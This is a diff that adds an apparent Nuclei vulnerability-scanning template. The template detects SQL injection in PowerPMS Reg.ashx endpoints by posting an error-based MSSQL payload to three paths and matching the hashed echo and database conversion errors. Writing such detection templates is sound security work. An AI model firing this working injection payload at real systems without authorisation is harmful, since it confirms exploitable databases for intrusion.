@@ -1,0 +1,37 @@
+id: powerpms-reg-ashx-sqli
+info:
+  name: PowerPMS Reg.ashx SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for SQL injection vulnerabilities in PowerPMS Reg.ashx endpoints by injecting a payload and verifying the response for specific patterns.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/weixin3.0/Reg.ashx"
+      - "{{BaseURL}}/weixin3.0/static/Reg.ashx"
+      - "{{BaseURL}}/PowerMobile2/Reg.ashx"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "hum=1'and+1<sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "\"success\":false"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+      - type: word
+        words:
+          - "<"
+        negative: true
+    stop-at-first-match: true
